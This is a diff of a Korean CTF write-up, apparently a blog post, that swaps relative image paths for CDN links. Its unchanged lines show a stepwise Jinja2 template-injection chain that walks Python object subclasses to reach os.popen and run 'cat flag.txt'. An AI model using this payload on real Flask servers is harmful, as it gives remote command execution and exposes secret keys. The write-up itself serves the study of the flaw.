@@ -87,31 +87,31 @@ FLAG는 `./flag.txt`에서 읽어와 `app.secret_key`로 저장하고 있다.
 <div markdown="1">
 
 `7*7`
-![|404x118](../../_image/2026-02-05-14-33-44.png)
+![404x118](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-33-44.png)
 
 `"".__class__`
-![|404x108](../../_image/2026-02-05-14-34-32.png)
+![404x108](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-34-32.png)
 
 `{{"".__class__.__base__}}`
-![|404x111](../../_image/2026-02-05-14-35-07.png)
+![404x111](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-35-07.png)
 
 `"".__class__.__base__.__subclasses__()`
-![|404x428](../../_image/2026-02-05-14-36-25.png)
+![404x428](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-36-25.png)
 
 `"".__class__.__base__.__subclasses__()[109].__init__`
-![|404x112](../../_image/2026-02-05-14-37-02.png)
+![404x112](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-37-02.png)
 
 `"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys']`
-![|404x109](../../_image/2026-02-05-14-37-46.png)
+![404x109](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-37-46.png)
 
 `"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os']`
-![|404x108](../../_image/2026-02-05-14-38-34.png)
+![404x108](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-38-34.png)
 
 `"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt')`
-![|404x107](../../_image/2026-02-05-14-39-19.png)
+![404x107](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-39-19.png)
 
 `{{"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt').read()}}`
-![|404x112](../../_image/2026-02-05-14-33-12.png)
+![404x112](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-33-12.png)
 
 </div>
 </details>
